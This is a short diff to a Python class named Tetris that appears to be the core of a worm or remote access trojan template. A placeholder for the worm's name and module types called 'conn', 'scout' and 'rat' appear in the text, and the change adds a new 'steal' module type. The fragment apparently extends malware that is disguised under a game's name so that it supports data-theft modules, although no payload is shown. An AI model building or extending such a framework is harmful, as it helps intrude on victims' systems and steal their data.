@@ -17,7 +17,7 @@ class Tetris:
     def __init__(self):
         self.name = "{{_WORM_NAME}}"
         self.__modules = {{pyTOOL.makeModulesDict(_PY_MODULES)}}
-        self._modules = {"conn" : [], "scout" : [], "rat" : []}
+        self._modules = {"conn" : [], "scout" : [], "rat" : [], "steal" : []}
         self._no_type_modules = []
         self.TH_mods = []
         self.TH_execute_data = None
@@ -164,6 +164,7 @@ class Tetris:
         self.executeData()
         while self.FLAG_working:
             sleep(1)
+            
             
     
     def Run(self) -> None:
